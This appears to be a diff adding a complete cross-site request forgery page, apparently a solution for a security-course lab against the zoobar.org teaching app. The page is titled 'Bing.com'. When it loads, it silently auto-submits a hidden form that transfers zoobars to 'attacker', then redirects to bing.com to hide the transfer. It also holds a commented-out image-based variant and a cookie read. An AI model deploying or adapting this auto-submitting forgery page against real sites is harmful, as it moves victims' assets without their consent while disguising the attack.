@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bing.com</title>
+
+</head>
+<body>
+<form action="http://zoobar.org/transfer.php" method="POST">
+    <input type="hidden" name="zoobars" value="1" />
+    <input type="hidden" name="recipient" value="attacker" />
+    <input type="submit" name="submission" id="form" value="Send"/>
+</form>
+<!--<img src="zoobar.org/transfer.php?recipient=attacker+submission=Send+zoobars=10">-->
+<script>
+    //let temp = document.cookie;
+    window.onload = function(){
+        document.getElementById("form").click();
+        setTimeout(function (){window.location="http://www.bing.com";}, 3);
+        //window.location.replace("http://www.bing.com");
+    };
+</script>
+</body>
+</html>
